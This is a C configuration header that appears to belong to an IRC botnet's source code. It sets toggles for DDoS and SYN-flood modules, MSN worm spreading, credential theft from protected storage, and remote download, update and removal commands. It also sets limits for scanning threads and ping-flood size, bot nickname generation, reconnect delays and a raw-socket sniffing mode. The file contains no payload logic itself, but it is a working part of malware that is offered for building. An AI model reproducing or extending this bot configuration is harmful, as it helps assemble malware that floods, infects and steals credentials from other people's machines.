//==========================================//
//----------------DEFINES-------------------//
//==========================================//
//											//
//#define NO_DDOS							//
//#define NO_SUPERSYN						//
//#define NO_MSNSPREAD						//
#define NO_PSTORE							//
//#define NO_DOWNLOAD						//
//#define NO_UPDATE							//
//											//
//#define NO_LOGOUT_CMD						//
//#define NO_REMOVE_CMD						//
//											//
#define NO_CONNCHECK						//
//											//
//==========================================//
//----------------DEFINES-------------------//
//==========================================//

#define PING_TIMEOUT	200	// If the bot hasnt recieved anything in this amount
								// of time it will quit and reconnect (s)

#define IRCLINE			514

#define MAX_TOKENS		64
#define MAX_LOGINS		3
#define MAX_THREADS		512

#define MAXPINGSIZE		65500
#define MAX_IP			16
#define MAX_HOSTNAME	256
#define MAX_NICKLEN		18
#define REQ_NICKLEN		7
#define REQ_IDENTLEN	6
#define REQ_REALNLEN	22

#define MAX_SCANDELAY	60
#define MIN_SCANDELAY	3

#define MAX_SCANTHRD	256
#define MAX_SCANTIME	9999

#define MAX_KEY_LENGTH	255
#define MAX_VALUE_NAME	16383

#define NICK_TYPE		N_RNDLTR
//#define NICK_TYPE		N_MINE
#define IDENT_TYPE		N_OS
#define REALN_TYPE		N_BOX

#define FLOOD_DELAY		2000	// Send flood delay (ms)
#define SFLOOD_DELAY	7000	// Reconnect flood delay (ms)
#define RUPTIME_DELAY	600000	// Record uptime check delay (ms)
#define SECURE_DELAY	600000	// Secure thread loop delay (ms)

#define AMPM(x) ((x>12)?("PM"):("AM"))
#define HOUR(x) ((x>12)?(x-12):(x))

#ifndef SIO_RCVALL
#define SIO_RCVALL			_WSAIOW(IOC_VENDOR,1)
#endif
